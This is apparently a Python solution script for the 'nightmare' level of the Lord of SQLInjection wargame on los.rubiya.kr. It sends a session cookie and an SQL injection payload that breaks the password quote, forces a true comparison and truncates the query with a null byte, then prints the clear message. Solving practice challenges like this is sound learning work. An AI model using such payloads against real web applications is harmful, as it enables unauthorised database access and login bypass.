#!/usr/bin/env python3

'''
# Summary
- We don't have to get ADMIN, just bypass QUERY is enough
- make it true QUERY
'''


import requests

header = {"Cookie": "PHPSESSID=❚❚❚❚❚❚❚❚❚❚❚❚❚❚❚❚❚❚❚❚❚❚❚❚❚❚❚❚❚❚;"}
url = "https://los.rubiya.kr/chall/nightmare_be1285a95aa20e8fa154cb977c37fee5.php"

payload = "?pw=')=0;%00"

response = requests.get(url + payload, headers=header)

result = response.text
if result.find("Clear!") != -1:
    end = result.split("Clear!")[0].split("<h2>")[1]
    print(end+"Clear!")